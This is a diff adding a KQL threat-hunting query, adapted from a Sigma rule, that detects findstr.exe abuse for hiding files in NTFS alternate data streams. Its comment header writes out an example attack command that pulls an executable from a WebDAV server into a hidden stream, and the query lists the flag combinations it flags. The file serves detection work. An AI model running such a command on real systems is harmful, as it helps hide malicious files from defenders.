@@ -1,0 +1,20 @@
+// Title: Abusing Findstr.exe for Defense Evasion
+// Desc: Attackers can use findstr to hide their artifacts or search specific strings and evade defense mechanism
+// Ref - https://lolbas-project.github.io/lolbas/Binaries/Findstr/
+// Ref - https://www.freebuf.com/articles/system/232074.html
+// Ref - https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/
+// MITRE: https://attack.mitre.org/techniques/T1564/004/ (Defense Evasion: Hide Artifacts: NTFS File Attributes)
+// Severity: medium
+// Trigger: findstr /V /L W3AllLov3LolBas \\webdavserver\folder\file.exe > c:\ADS\file.txt:file.exeDefense Evasion
+// Usecase: Add a file to an alternate data stream from a webdav server to hide from defensive counter measures
+// From: https://github.com/SigmaHQ/sigma/blob/master/rules/windows/proc_creation_win_lolbin_findstr.yml
+// By: Frankie Li
+// On: 06-05-2023
+DeviceProcessEvents 
+| where ((ProcessCommandLine contains @'findstr' or FolderPath endswith @'findstr.exe' 
+    or ProcessVersionInfoOriginalFileName =~ @'FINDSTR.EXE' 
+    or InitiatingProcessVersionInfoOriginalFileName =~ @'FINDSTR.EXE') 
+    and (((ProcessCommandLine contains @' /v ' or ProcessCommandLine contains @' -v ') 
+    and (ProcessCommandLine contains @' /l ' or ProcessCommandLine contains @' -l ')) 
+    or ((ProcessCommandLine contains @' /s ' or ProcessCommandLine contains @' -s ') and (ProcessCommandLine contains @' /i ' or ProcessCommandLine contains @' -i '))))
+| project Timestamp, DeviceName, AccountName, InitiatingProcessParentFileName, FolderPath, ProcessCommandLine
